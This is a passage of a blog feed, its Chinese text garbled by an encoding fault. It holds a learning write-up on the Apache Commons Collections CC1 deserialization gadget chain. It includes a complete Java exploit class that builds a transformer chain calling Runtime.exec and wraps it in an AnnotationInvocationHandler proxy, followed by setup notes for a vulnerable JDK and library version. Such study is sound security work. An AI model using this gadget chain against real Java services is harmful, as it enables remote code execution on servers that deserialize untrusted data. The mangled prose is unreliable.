class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>  </span><br><span class="line">                (<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">Mapdecorate</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line">        <span class="comment">//Áõ∏ÂΩì‰∫éË£ÖÈ•∞Âô®ÔºåÂç≥Ê≠§Êó∂Mapdecorate‰πüÊúâinvokerTransformerÂØπË±°ÁöÑÂäüËÉΩ  </span></span><br><span class="line">  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">classDeclaredMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        classDeclaredMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        classDeclaredMethod.invoke(Mapdecorate,runtime);  </span><br><span class="line">        <span class="comment">//ÊúÄÂêéËøôÈáåË∞ÉÁî®‰∫ÜLazyMapÁöÑgetÊñπÊ≥ïÈáåÈù¢ÊâßË°å‰∫ÜtransformÊñπÊ≥ïÔºåÂèÇÊï∞‰∏∫runtime  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819409.png" alt="image-20230430181951307"><br>ËØÅÊòéËøôÊù°ÈìæÂà∞ÁõÆÂâçÊòØÂèØË°åÁöÑÔºåÁÑ∂ÂêéÊâæË∞ÅË∞ÉÁî®‰∫ÜLazyMap‰∏≠ÁöÑgetÊñπÊ≥ïÔºåÊúÄÁªàÁõÆÊ†áÊòØÊâæÂà∞readObject<br>ËøôÈáåÂú®AnnotationInvocationHandlerÁ±ª‰∏ãÁöÑinvokeÊñπÊ≥ï‰∏≠Ë∞ÉÁî®‰∫ÜgetÊñπÊ≥ïÔºåËøôÈáåfind usages getÊñπÊ≥ïÁöÑËØùÁªìÊûúÂæàÂ§öÔºåÊâÄ‰ª•ÊàëÁõ¥Êé•Âú®CC1ÁöÑÂè¶‰∏ÄÊù°Èìæ‰∏≠ËøõÂÖ•Ëøô‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820476.png" alt="image-20230430182006425"><br>ÂêåÊó∂Ëøô‰∏™Á±ª‰∏≠‰πüÂ≠òÂú®readObjectÊñπÊ≥ïÔºåÁõ∏ÂΩì‰∫éÊâæÂà∞ÂÖ•Âè£ÔºåËÄå‰∏îÈÄöËøáÊûÑÈÄ†ÊñπÊ≥ïÂèëÁé∞Ëøô‰∏™memberValue‰πüÊòØÂèØÊéßÁöÑÔºåÊâÄ‰ª•Áé∞Âú®ÊòØËß£ÂÜ≥ÊÄé‰πàËøõÂÖ•Ëøô‰∏™Á±ªÁöÑinvokeÊñπÊ≥ïÔºåËøôÈáåÂ∞±ÂèØ‰ª•ÁªìÂêàÂä®ÊÄÅ‰ª£ÁêÜÔºå‰∏Ä‰∏™Á±ªË¢´Âä®ÊÄÅ‰ª£ÁêÜ‰πãÂêéÊÉ≥Ë¶ÅÈÄöËøá‰ª£ÁêÜË∞ÉÁî®Ëøô‰∏™Á±ªÂøÖÈ°ªÈÄöËøáinvokeÊñπÊ≥ïÔºåÁªßÁª≠ÂØªÊâæ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820664.png" alt="image-20230430182018517"><br>ÂèØ‰ª•ÁúãÂà∞Âú®readObjectÊñπÊ≥ï‰∏≠memberValuesË∞ÉÁî®‰∫ÜentrySetÊñπÊ≥ïÔºåÊâÄ‰ª•ËøôÈáåËÆ©memberValuesÊàê‰∏∫‰ª£ÁêÜÂØπË±°ÈÇ£‰πàË∞ÉÁî®entrySetÊñπÊ≥ïÊó∂Â∞±‰ºöËøõÂÖ•invokeÊñπÊ≥ï</p><h2 id="ÁºñÂÜôEXP"><a href="#ÁºñÂÜôEXP" class="headerlink" title="ÁºñÂÜôEXP"></a>ÁºñÂÜôEXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//Áî®‰∫éËß£ÂÜ≥Á¨¨‰∏Ä‰∏™ÈóÆÈ¢òÔºåRuntime‰∏çËÉΩË¢´Â∫èÂàóÂåñ  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerËß£ÂÜ≥proxyMap‰∏çËÉΩÂ∫èÂàóÂåñÔºåÁÑ∂ÂêéÈÄöËøáÊûÑÈÄ†ÊñπÊ≥ïÂ∞Ü‰ª£ÁêÜÂØπË±°proxyMapËµãÂÄºÁªômemberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line">        serialize(invocationHandler);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820365.png" alt="image-20230430182035279"></p><h2 id="Ë∞ÉÁî®Èìæ"><a href="#Ë∞ÉÁî®Èìæ" class="headerlink" title="Ë∞ÉÁî®Èìæ"></a>Ë∞ÉÁî®Èìæ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">InvokeTransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">AnnotationInvocationHandler#readObject</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ËæÖÂä©Èìæ</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™ÊµÅÁ®ãÂõæÊáíÂæóÁîª‰∫ÜÔºåÂºÄÊëÜ</p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCCÈìæ1</title>
      <link href="/2023/04/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE1/"/>
      <url>/2023/04/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE1/</url>
      
        <content type="html"><![CDATA[<h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>ÊÑüËßâÊúÄËøëJavaËÄÉÁöÑÁî®ÁöÑÂæàÂ§öÔºåËá™Â∑±ÂØπ‰∫éJavaÊòØ0Âü∫Á°ÄÔºåËÆ©ÊàëËø´ÂàáÊÉ≥Ë¶ÅÂºÄÂßãÂ≠¶ÔºåÁúã‰∫ÜÂ§ß‰Ω¨ÁöÑÂ≠¶‰π†ÈìæÊòØ‰ªéÂºÄÂèëÂºÄÂßãÔºåÈÇ£Ê†∑ÊÑüËßâÂ∞±Â§™ÊÖ¢‰∫ÜËÄå‰∏îËá™Â∑±ÂØπ‰∫éÂºÄÂèëÂÖ¥Ë∂£‰∏çÂ§ßÔºå‰ΩÜÊòØÂÅèÂÅèÂèàÁ¶ª‰∏çÂºÄÂºÄÂèëÔºåÂè™ËÉΩËæπÂ≠¶ÂºÄÂèëËæπÁúãÂÆâÂÖ®ÔºåËôΩÁÑ∂ÊúâÁÇπÊÄ•‰∫Ü‰ΩÜÊòØ‰πüÊ≤°ÂäûÊ≥ï‰∫Ü</p><h2 id="‰∏ÄÁÇπÂª∫ËÆÆ"><a href="#‰∏ÄÁÇπÂª∫ËÆÆ" class="headerlink" title="‰∏ÄÁÇπÂª∫ËÆÆ"></a>‰∏ÄÁÇπÂª∫ËÆÆ</h2><p>Â¶ÇÊûúÊ≤°ÊúâÂ≠¶ËøáJavaÊàñËÄÖ‰∏ç‰∫ÜËß£ideaÁöÑÊìç‰ΩúÁöÑËØùÂºÄÂßãCCÈìæ‰πãÂâçÂº∫ÁÉàÂª∫ËÆÆÂÖàË∑üURLDNSÈìæÔºåÊääËØ•Ë∏©ÁöÑÂùëË∏©‰∫ÜÂÜçÂºÑCCÈìæ‰ºöÈ°∫ÁïÖÂæàÂ§ö</p><h2 id="ÁéØÂ¢ÉÈÖçÁΩÆ"><a href="#ÁéØÂ¢ÉÈÖçÁΩÆ" class="headerlink" title="ÁéØÂ¢ÉÈÖçÁΩÆ"></a>ÁéØÂ¢ÉÈÖçÁΩÆ</h2><p>ËøôÈáåÊàëÂ∞±Âàó‰∏Ä‰∏ãËá™Â∑±Ë∏©ÁöÑÂùëÔºå‰Ωú‰∏∫‰∏Ä‰∏™ÂØπJavaÂíåidea‰∏çÁÜüÊÇâÁöÑÊñ∞ÊâãÂÆπÊòìÁäØÁöÑÈîô</p><h3 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h3><p>jdkË¶ÅÊ±ÇÊòØjdk8u65ÔºåÂú®ÂÆòÁΩëÊàë‰∏ãËΩΩÁöÑÊó∂ÂÄôÈÄâÊã©8u65‰ΩÜÊòØ‰∏ãËΩΩÁöÑÂç¥‰∏çÊòØÔºå<a href="https://blog.lupf.cn/articles/2022/02/20/1645352101537.html">Âè¶Â§ñÁöÑÂπ≥Âè∞</a><br>ÂÆâË£Ö‰ºöÂêåÊó∂ÂÆâË£ÖjdkÂíåjreÊàë‰ª¨ÈúÄË¶ÅÁöÑÊòØjdk‰∏çË¶ÅÊääjre‰πüÊîæÂú®jdkÁõÆÂΩï‰∏ãÔºå‰∏çÁÑ∂ideaÂØºÂÖ•jdk‰ºöÂ§±Ë¥•‰∏ãËΩΩÂÆåÁöÑÁõÆÂΩïÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262142103.png" alt="image-20230426214158005"></p><h3 id="Âä†ÂÖ•‰æùËµñ"><a href="#Âä†ÂÖ•‰æùËµñ" class="headerlink" title="Âä†ÂÖ•‰æùËµñ"></a>Âä†ÂÖ•‰æùËµñ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂΩìÂàõÂª∫Â•ΩmavenÈ°πÁõÆÂêéÂú®‰æùËµñ‰∏≠Â¶ÇÊûúÊ≤°ÊúâÊîæ‰æùËµñÁöÑÊ†áÁ≠æ<code>&lt;dependencies&gt; &lt;/dependencies&gt;</code>ÈÇ£‰πàÈúÄË¶Å‰Ω†Ëá™Â∑±ÂéªÂàõÂª∫Ôºå‰Ω†ÁöÑ‰æùËµñÂøÖÈ°ªÁî±ÂÆÉÂåÖË£π</p><h2 id="ÂÖ∂ÂÆÉÁéØÂ¢É"><a href="#ÂÖ∂ÂÆÉÁéØÂ¢É" class="headerlink" title="ÂÖ∂ÂÆÉÁéØÂ¢É"></a>ÂÖ∂ÂÆÉÁéØÂ¢É</h2><p>ÂèÇËÄÉÔºö<br><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">JavaÂèçÂ∫èÂàóÂåñCommons-CollectionsÁØá01-CC1Èìæ | Drunkbaby‚Äôs Blog (drun1baby.top)</a><br><a href="https://www.lengf233.top/2023/03/19/ru-he-shou-xie-yi-tiao-cc1-lian/">https://www.lengf233.top/2023/03/19/ru-he-shou-xie-yi-tiao-cc1-lian/</a><br>Âü∫Êú¨‰∏äÂ∞±Ê≤°Âï•ÈóÆÈ¢ò‰∫Ü</p><h2 id="Common-Collections-Áõ∏ÂÖ≥‰ªãÁªç"><a href="#Common-Collections-Áõ∏ÂÖ≥‰ªãÁªç" class="headerlink" title="Common-Collections Áõ∏ÂÖ≥‰ªãÁªç"></a>Common-Collections Áõ∏ÂÖ≥‰ªãÁªç</h2><p>Ëøô‰∏ÄÈÉ®ÂàÜÂâçËæà‰ª¨Â∑≤ÁªèËØ¥ÁöÑÂæàÊ∏ÖÊ•ö‰∫ÜÔºåÊàëËøôÈáåÊîæ‰∏Ä‰∏ãÊñπ‰æøËá™Â∑±ËßÇÁúã<br><a href="http://commons.apache.org/">Apache Commons</a>ÊòØApacheËΩØ‰ª∂Âü∫Èáë‰ºöÁöÑÈ°πÁõÆÔºåÊõæÁªèÈö∂Â±û‰∫é<code>Jakarta</code>È°πÁõÆ„ÄÇ<code>Commons</code>ÁöÑÁõÆÁöÑÊòØÊèê‰æõÂèØÈáçÁî®ÁöÑ„ÄÅËß£ÂÜ≥ÂêÑÁßçÂÆûÈôÖÁöÑÈÄöÁî®ÈóÆÈ¢ò‰∏îÂºÄÊ∫êÁöÑJava‰ª£Á†Å„ÄÇCommonsÁî±‰∏âÈÉ®ÂàÜÁªÑÊàêÔºö<code>Proper</code>ÔºàÊòØ‰∏Ä‰∫õÂ∑≤ÂèëÂ∏ÉÁöÑÈ°πÁõÆÔºâ„ÄÅ<code>Sandbox</code>ÔºàÊòØ‰∏Ä‰∫õÊ≠£Âú®ÂºÄÂèëÁöÑÈ°πÁõÆÔºâÂíå<code>Dormant</code>ÔºàÊòØ‰∏Ä‰∫õÂàöÂêØÂä®ÊàñËÄÖÂ∑≤ÁªèÂÅúÊ≠¢Áª¥Êä§ÁöÑÈ°πÁõÆÔºâ„ÄÇ</p><ul><li>ÁÆÄÂçïÊù•ËØ¥ÔºåCommon-Collections Ëøô‰∏™È°πÁõÆÂºÄÂèëÂá∫Êù•ÊòØ‰∏∫‰∫ÜÁªô Java Ê†áÂáÜÁöÑ <code>Collections API</code> Êèê‰æõ‰∫ÜÁõ∏ÂΩìÂ•ΩÁöÑË°•ÂÖÖ„ÄÇÂú®Ê≠§Âü∫Á°Ä‰∏äÂØπÂÖ∂Â∏∏Áî®ÁöÑÊï∞ÊçÆÁªìÊûÑÊìç‰ΩúËøõË°å‰∫ÜÂæàÂ•ΩÁöÑÂ∞ÅË£Ö„ÄÅÊäΩË±°ÂíåË°•ÂÖÖ„ÄÇ</li></ul><h3 id="ÂåÖÁªìÊûÑ‰ªãÁªç"><a href="#ÂåÖÁªìÊûÑ‰ªãÁªç" class="headerlink" title="ÂåÖÁªìÊûÑ‰ªãÁªç"></a>ÂåÖÁªìÊûÑ‰ªãÁªç</h3><ul><li><code>org.apache.commons.collections</code> ‚Äì CommonsCollectionsËá™ÂÆö‰πâÁöÑ‰∏ÄÁªÑÂÖ¨Áî®ÁöÑÊé•Âè£ÂíåÂ∑•ÂÖ∑Á±ª</li><li><code>org.apache.commons.collections.bag</code> ‚Äì ÂÆûÁé∞BagÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.bidimap</code> ‚Äì ÂÆûÁé∞BidiMapÁ≥ªÂàóÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.buffer</code> ‚Äì ÂÆûÁé∞BufferÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.collection</code> ‚ÄìÂÆûÁé∞java.util.CollectionÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.comparators</code>‚Äì ÂÆûÁé∞java.util.ComparatorÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.functors</code> ‚ÄìCommons CollectionsËá™ÂÆö‰πâÁöÑ‰∏ÄÁªÑÂäüËÉΩÁ±ª</li><li><code>org.apache.commons.collections.iterators</code> ‚Äì ÂÆûÁé∞java.util.IteratorÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.keyvalue</code> ‚Äì ÂÆûÁé∞ÈõÜÂêàÂíåÈîÆ&#x2F;ÂÄºÊò†Â∞ÑÁõ∏ÂÖ≥ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.list</code> ‚Äì ÂÆûÁé∞java.util.ListÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.map</code> ‚Äì ÂÆûÁé∞MapÁ≥ªÂàóÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li><li><code>org.apache.commons.collections.set</code> ‚Äì ÂÆûÁé∞SetÁ≥ªÂàóÊé•Âè£ÁöÑ‰∏ÄÁªÑÁ±ª</li></ul><h2 id="ÂºÄÂßãÂàÜÊûê"><a href="#ÂºÄÂßãÂàÜÊûê" class="headerlink" title="ÂºÄÂßãÂàÜÊûê"></a>ÂºÄÂßãÂàÜÊûê</h2><p>CC1ÈìæÂàÜ‰∏∫‰∏§‰∏™ÁâàÊú¨ÔºåËøôÈáåÂºïÁî®‰∏Ä‰∏ãlengf233Â∏àÂÇÖÁöÑ‰ªãÁªçÔºå‚ÄúÂÖ≥‰∫éCC1ÈìæÂÖ∂ÂÆûÊòØÊúâ‰∏§Êù°ÁöÑÔºå‰∏Ä‰∏™ÊòØLazyMapËøô‰∏ÄÊù°ÈìæÔºåÂè¶Â§ñ‰∏ÄÊù°Â∞±ÊòØTransformMapÈìæÔºåÁ¨¨‰∫åÊù°ÈìæÊòØ‰º†ÂÖ•ÂõΩÂÜÖ‰πãÂêéË¢´ÂèëÁé∞ÁöÑ„ÄÇ‚ÄùÂæàÂ§öÂàÜÊûêÊñáÁ´†Ê≤°Êúâ‰ªãÁªçËøô‰∏ÄÁÇπÔºåÊàë‰πüÊòØÁúã‰∫ÜÂ∏àÂÇÖÁöÑÊñáÁ´†ÊâçÁü•ÈÅìÔºåËøôÈáåÂàÜÊûêTransformMapÈìæ<br>Áî®‰∏Ä‰∏ã‰Ω¨ÁöÑÊµÅÁ®ãÂàÜÊûêÂõæ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144895.png" alt="image-20230426214421823"><br>Êàë‰ª¨ÁöÑÁõÆÁöÑÊòØÂú®ÊúÄÂêéÁöÑÂëΩ‰ª§ÊâßË°åÔºåÊó¢ÁÑ∂Âú®ÊúÄÂêéÈÇ£‰πàÂøÖÁÑ∂ÈúÄË¶Å‰∏Ä‰∏™Âà∞ËøôÈáåÁöÑÁ±ªÔºåÈÄâÊã©‰∏Ä‰∏™Êé•Êî∂‰ªªÊÑèÂØπË±°Âê´ÊúâreadObjectÊñπÊ≥ïÁöÑÁ±ª‰Ωú‰∏∫ÂÖ•Âè£Á±ªÔºå‰∏≠Èó¥Áî®ÈìæÂ≠êÂÖ∂ÂÆÉÊñπÊ≥ïÈìæËµ∑Êù•ÈÇ£‰πàÂ∞±Âà∞Ëææ‰∫ÜÁõÆÁöÑ</p><h3 id="ÈÄÜÂêëÂàÜÊûêÔºåÂØªÊâæexecÊñπÊ≥ï"><a href="#ÈÄÜÂêëÂàÜÊûêÔºåÂØªÊâæexecÊñπÊ≥ï" class="headerlink" title="ÈÄÜÂêëÂàÜÊûêÔºåÂØªÊâæexecÊñπÊ≥ï"></a>ÈÄÜÂêëÂàÜÊûêÔºåÂØªÊâæexecÊñπÊ≥ï</h3><p>Êàë‰ª¨Áõ¥Êé•ÊâæÂì™Èáå‰ºöË∞ÉÁî®execÊñπÊ≥ïÔºåÂâç‰∫∫ÁªèÈ™åÂú®TransformerÊé•Âè£‰∏≠ÔºåÊâÄ‰ª•Áõ¥Êé•Âà∞ËøôÈáåÊù•ÔºåÂú®Common-Collections.jarÂåÖ‰∏≠ÊâæÂà∞Ëøô‰∏™Êé•Âè£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144606.png" alt="image-20230426214435545"><br>ÁÑ∂Âêéctrl+alt+bÂèØ‰ª•Êü•ÁúãÂÆûÁé∞‰∫ÜËØ•Êé•Âè£ÁöÑÁ±ªÔºåÊúÄÁªàÊâæÂà∞‰∫ÜInvokerTransformerÁ±ªÔºåÂú®ËØ•Á±ª‰∏ãÊúâ‰∏™transformÊñπÊ≥ïÈáåÈù¢Ë∞ÉÁî®‰∫ÜinvokeÊñπÊ≥ïÔºåÊ≠§Êó∂ËøòÊ≤°ÊÑüËßâÊúâ‰ªÄ‰πàÔºåÊàë‰ª¨Ë∑üËøõÁúã‰∏Ä‰∏ãÔºåÂèØ‰ª•ÁúãÂà∞ÂÆÉÊâÄÂú®ÁöÑÁ±ª‰∏∫MethodÁ±ªÔºåËøô‰∏™Á±ªÊâÄÂú®ÁöÑÂåÖ‰∏∫Java‰∏≠ÈºéÈºéÂ§ßÂêçÁöÑÂèçÂ∞ÑÂåÖÔºåMethod‰∏≠<strong>invoke</strong>(Object obj,Object‚Ä¶args)ÊñπÊ≥ïÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫Á±ªÁöÑÂÆû‰æãÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞‰∏∫Áõ∏Â∫îÂáΩÊï∞‰∏≠ÁöÑÂèÇÊï∞<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144759.png" alt="image-20230426214448720"><br>ÈÇ£‰πàÂ∞±ÂèØ‰ª•Âà©Áî®ÂèçÂ∞ÑË∞ÉÁî®‰ªªÊÑèÁ±ªÔºåÂÖàÂ∞ùËØïÂà©Áî®ÂÆÉÊù•Âºπ‰∏™ËÆ°ÁÆóÂô®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 